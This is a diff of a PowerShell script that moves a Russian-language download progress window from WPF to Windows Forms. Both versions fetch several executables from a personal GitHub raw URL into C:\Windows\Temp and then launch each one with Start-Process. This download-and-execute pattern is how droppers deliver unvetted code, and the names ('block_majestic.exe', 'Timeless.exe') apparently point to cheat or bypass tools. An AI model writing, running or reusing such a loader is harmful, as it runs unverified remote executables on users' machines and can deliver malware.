@@ -1,4 +1,5 @@
 Add-Type -AssemblyName PresentationFramework
+Add-Type -AssemblyName System.Windows.Forms
 
 $downloads = @(
     @{ URL = 'https://github.com/fosslas/users/raw/refs/heads/main/Timeless.exe'; Path = 'C:\Windows\Temp\Timeless.exe' },
@@ -6,62 +7,71 @@ $downloads = @(
     @{ URL = 'https://github.com/fosslas/users/raw/refs/heads/main/block_majestic.exe'; Path = 'C:\Windows\Temp\block_majestic.exe' }
 )
 
-[xml]$xaml = @"
-<Window xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
-        Title="Загрузка файлов" Height="200" Width="400"
-        WindowStartupLocation="CenterScreen" ResizeMode="NoResize">
-    <StackPanel Margin="20">
-        <TextBlock Name="StatusText" Text="Подготовка..." FontSize="14" Margin="0,0,0,10"/>
-        <ProgressBar Name="ProgressBar" Height="25" Minimum="0" Maximum="100" Margin="0,0,0,10"/>
-        <TextBlock Name="PercentText" Text="0%" FontSize="12" HorizontalAlignment="Center"/>
-    </StackPanel>
-</Window>
-"@
+$form = New-Object System.Windows.Forms.Form
+$form.Text = "Загрузка файлов"
+$form.Size = New-Object System.Drawing.Size(400, 150)
+$form.StartPosition = "CenterScreen"
+$form.FormBorderStyle = "FixedDialog"
+$form.MaximizeBox = $false
 
-$reader = [System.Xml.XmlNodeReader]::new($xaml)
-$window = [System.Windows.Markup.XamlReader]::Load($reader)
+$label = New-Object System.Windows.Forms.Label
+$label.Location = New-Object System.Drawing.Point(20, 20)
+$label.Size = New-Object System.Drawing.Size(360, 20)
+$label.Text = "Подготовка..."
+$form.Controls.Add($label)
 
-$statusText  = $window.FindName("StatusText")
-$progressBar = $window.FindName("ProgressBar")
-$percentText = $window.FindName("PercentText")
+$progressBar = New-Object System.Windows.Forms.ProgressBar
+$progressBar.Location = New-Object System.Drawing.Point(20, 50)
+$progressBar.Size = New-Object System.Drawing.Size(360, 25)
+$progressBar.Minimum = 0
+$progressBar.Maximum = 100
+$form.Controls.Add($progressBar)
 
-$window.Add_Loaded({
-    $script = {
-        foreach ($item in $downloads) {
-            $name = Split-Path $item.Path -Leaf
-            $window.Dispatcher.Invoke({ $statusText.Text = "Скачиваю: $name" })
+$percentLabel = New-Object System.Windows.Forms.Label
+$percentLabel.Location = New-Object System.Drawing.Point(180, 80)
+$percentLabel.Size = New-Object System.Drawing.Size(50, 20)
+$percentLabel.Text = "0%"
+$form.Controls.Add($percentLabel)
 
-            $webClient = New-Object System.Net.WebClient
+$form.Show()
+$form.Refresh()
 
-            $webClient.add_DownloadProgressChanged({
-                $pct = $_.ProgressPercentage
-                $window.Dispatcher.Invoke({
-                    $progressBar.Value = $pct
-                    $percentText.Text  = "$pct%"
-                })
-            }.GetNewClosure())
+foreach ($item in $downloads) {
+    $name = Split-Path $item.Path -Leaf
+    $label.Text = "Скачиваю: $name"
+    $progressBar.Value = 0
+    $percentLabel.Text = "0%"
+    $form.Refresh()
 
-            $task = $webClient.DownloadFileTaskAsync($item.URL, $item.Path)
-            $task.Wait()
-        }
+    $webClient = New-Object System.Net.WebClient
+    $currentPath = $item.Path
 
-        $window.Dispatcher.Invoke({
-            $statusText.Text  = "Все файлы скачаны!"
-            $progressBar.Value = 100
-            $percentText.Text  = "100%"
-        })
+    $webClient.add_DownloadProgressChanged({
+        $pct = $_.ProgressPercentage
+        $progressBar.Value = $pct
+        $percentLabel.Text = "$pct%"
+        $form.Refresh()
+    }.GetNewClosure())
 
-        Start-Sleep -Seconds 1
-        $window.Dispatcher.Invoke({ $window.Close() })
+    $task = $webClient.DownloadFileTaskAsync($item.URL, $item.Path)
 
-        foreach ($item in $downloads) {
-            Start-Process $item.Path
-        }
+    while (-not $task.IsCompleted) {
+        [System.Windows.Forms.Application]::DoEvents()
+        Start-Sleep -Milliseconds 50
     }
 
-    $thread = [System.Threading.Thread]::new([System.Threading.ThreadStart]$script)
-    $thread.IsBackground = $true
-    $thread.Start()
-})
+    $label.Text = "Скачано: $name"
+    $form.Refresh()
+}
 
-$window.ShowDialog() | Out-Null
+$label.Text = "Все файлы скачаны!"
+$progressBar.Value = 100
+$percentLabel.Text = "100%"
+$form.Refresh()
+Start-Sleep -Seconds 1
+
+$form.Close()
+
+foreach ($item in $downloads) {
+    Start-Process $item.Path
+}
